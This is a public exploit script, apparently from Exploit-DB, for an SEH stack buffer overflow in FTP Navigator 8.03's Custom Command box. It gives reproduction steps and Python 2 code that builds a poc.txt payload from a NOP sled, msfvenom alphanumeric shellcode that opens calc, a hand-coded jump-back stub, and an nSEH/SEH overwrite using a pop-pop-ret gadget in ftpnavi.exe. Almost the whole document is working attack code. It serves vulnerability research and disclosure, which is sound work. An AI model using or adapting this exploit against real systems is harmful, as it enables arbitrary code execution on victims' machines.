# Exploit Title: FTP Navigator 8.03 - Stack Overflow (SEH)
# Date: December 28th, 2019
# Exploit Author: boku
# Discovered by: Chris Inzinga
# Original DoS: FTP Navigator 8.03 - 'Custom Command' Denial of Service (SEH) 
# Original DoS Link: https://www.exploit-db.com/exploits/47794
# Software Vendor: http://www.internet-soft.com/
# Software Link: https://www.softpedia.com/dyn-postdownload.php/5edd515b8045f156a9dd48599c2539e5/5dfa4560/d0c/0/1
# Version: Version 8.03
# Tested on: Microsoft Windows 7 Enterprise - 6.1.7601 Service Pack 1 Build 7601 (x86-64)
# Recreate:

#!/usr/bin/python
#   1) Generate 'poc.txt' payload using python 2.7.x
#   2) On target Windows machine, open the file 'poc.txt' with notepad, then Select-All & Copy
#   3) Install & Open FTP Navigator v8.03
#   4) Go to Menu Bar > FTP-Server Drop-down > click Custom Command
#      - A textbox will appear on the bottom of the right window
#   5) Paste payload from generated txt file into textbox
#   6) Click "Do it"
#      - The program will crash & calculator will open
blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # bash green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # bash red   error   bullet
try:
    nops      = '\x90'*400
    # msfvenom -p windows/exec CMD='calc' -b '\x00' --platform windows -v shellcode -a x86 -f python -e x86/alpha_upper
    #x86/alpha_upper succeeded with size 447 (iteration=0)
    shellcode =  b""
    shellcode += b"\x89\xe7\xda\xd6\xd9\x77\xf4\x58\x50\x59\x49"
    shellcode += b"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a"
    shellcode += b"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30"
    shellcode += b"\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41"
    shellcode += b"\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42"
    shellcode += b"\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a"
    shellcode += b"\x49\x4b\x4c\x4a\x48\x4d\x52\x35\x50\x35\x50"
    shellcode += b"\x33\x30\x53\x50\x4c\x49\x4d\x35\x50\x31\x39"
    shellcode += b"\x50\x52\x44\x4c\x4b\x50\x50\x56\x50\x4c\x4b"
    shellcode += b"\x46\x32\x44\x4c\x4c\x4b\x31\x42\x42\x34\x4c"
    shellcode += b"\x4b\x42\x52\x46\x48\x34\x4f\x4f\x47\x51\x5a"
    shellcode += b"\x51\x36\x36\x51\x4b\x4f\x4e\x4c\x37\x4c\x33"
    shellcode += b"\x51\x33\x4c\x44\x42\x56\x4c\x57\x50\x4f\x31"
    shellcode += b"\x58\x4f\x54\x4d\x45\x51\x4f\x37\x5a\x42\x4b"
    shellcode += b"\x42\x36\x32\x30\x57\x4c\x4b\x51\x42\x34\x50"
    shellcode += b"\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x30\x4c\x32"
    shellcode += b"\x31\x34\x38\x4b\x53\x57\x38\x43\x31\x4e\x31"
    shellcode += b"\x46\x31\x4c\x4b\x31\x49\x51\x30\x45\x51\x48"
    shellcode += b"\x53\x4c\x4b\x47\x39\x44\x58\x4b\x53\x37\x4a"
    shellcode += b"\x31\x59\x4c\x4b\x56\x54\x4c\x4b\x35\x51\x4e"
    shellcode += b"\x36\x50\x31\x4b\x4f\x4e\x4c\x39\x51\x38\x4f"
    shellcode += b"\x34\x4d\x45\x51\x59\x57\x30\x38\x4b\x50\x43"
    shellcode += b"\x45\x5a\x56\x55\x53\x33\x4d\x4a\x58\x57\x4b"
    shellcode += b"\x53\x4d\x31\x34\x54\x35\x4a\x44\x36\x38\x4c"
    shellcode += b"\x4b\x31\x48\x36\x44\x45\x51\x38\x53\x35\x36"
    shellcode += b"\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x30\x58\x35"
    shellcode += b"\x4c\x53\x31\x49\x43\x4c\x4b\x44\x44\x4c\x4b"
    shellcode += b"\x55\x51\x38\x50\x4d\x59\x47\x34\x31\x34\x56"
    shellcode += b"\x44\x51\x4b\x51\x4b\x55\x31\x46\x39\x31\x4a"
    shellcode += b"\x30\x51\x4b\x4f\x4d\x30\x31\x4f\x31\x4f\x50"
    shellcode += b"\x5a\x4c\x4b\x42\x32\x4a\x4b\x4c\x4d\x31\x4d"
    shellcode += b"\x53\x5a\x33\x31\x4c\x4d\x4b\x35\x48\x32\x33"
    shellcode += b"\x30\x55\x50\x33\x30\x56\x30\x32\x48\x30\x31"
    shellcode += b"\x4c\x4b\x42\x4f\x4d\x57\x4b\x4f\x38\x55\x4f"
    shellcode += b"\x4b\x4c\x30\x4f\x45\x59\x32\x56\x36\x55\x38"
    shellcode += b"\x59\x36\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x59"
    shellcode += b"\x45\x37\x4c\x54\x46\x43\x4c\x54\x4a\x4d\x50"
    shellcode += b"\x4b\x4b\x4b\x50\x34\x35\x33\x35\x4f\x4b\x51"
    shellcode += b"\x57\x32\x33\x53\x42\x52\x4f\x42\x4a\x35\x50"
    shellcode += b"\x50\x53\x4b\x4f\x39\x45\x42\x43\x53\x51\x42"
    shellcode += b"\x4c\x32\x43\x53\x30\x41\x41"
    jmp2nops   = '\xe8\xff\xff\xff\xff' # call +4       // This call will land us at the last \xff of our call instruction
    jmp2nops  += '\xc3'                 # ret/inc ebx   // Since EIP is at \xff after call, this will be interpruted as: \xff\xc3 =inc ebx (a nop instruction)
    jmp2nops  += '\x59'                 # pop ecx       // Pop the memory location from the call instruction that was pushed onto the stack into the ECX register
    jmp2nops  += '\x31\xd2'             # xor edx, edx  // Clear the EDX register. We are going to jump to the beginning of our buffer.
    jmp2nops  += '\x66\x81\xca\xfc\x0f' # or dx, 4092   // EDX is now equal to 0x00000ffc
    jmp2nops  += '\x66\x29\xd1'         # sub ex, dx    // We subtract 4092 bytes from our memory location in the ECX register.
    jmp2nops  += '\xff\xe1'             # jmp ecx       // Now we jump back to the beginning of our buffer; into our NOP sled.
    offset     = '\x41' * (4112-len(nops+shellcode+jmp2nops))
    nSEH       = '\xeb\xeb\x90\x90'     # jmp short -22 (to jmp2nops)
    # 0x00457576 [ftpnavi.exe] : pop edx # pop ebx # ret  
    # | Rebase: False | ASLR: False | SafeSEH: False
    # | (c:\FTP Navigator\ftpnavi.exe) | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ}
    SEH        = '\x76\x75\x45'         # SEH 3 byte overwrite
    payload    = nops+shellcode+offset+jmp2nops+nSEH+SEH
    File       = 'poc.txt'
    f          = open(File, 'w')  # open file for write
    f.write(payload)
    f.close()                     # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'